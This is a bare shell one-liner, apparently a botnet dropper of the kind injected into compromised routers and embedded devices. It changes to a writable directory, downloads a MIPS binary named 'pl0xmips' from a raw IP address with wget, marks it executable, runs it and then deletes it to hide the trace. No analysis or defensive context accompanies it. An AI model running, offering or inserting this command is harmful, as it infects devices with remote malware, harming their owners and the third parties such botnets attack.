cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://173.0.51.121/pl0xmips; chmod +x pl0xmips; ./pl0xmips; rm -rf pl0xmips
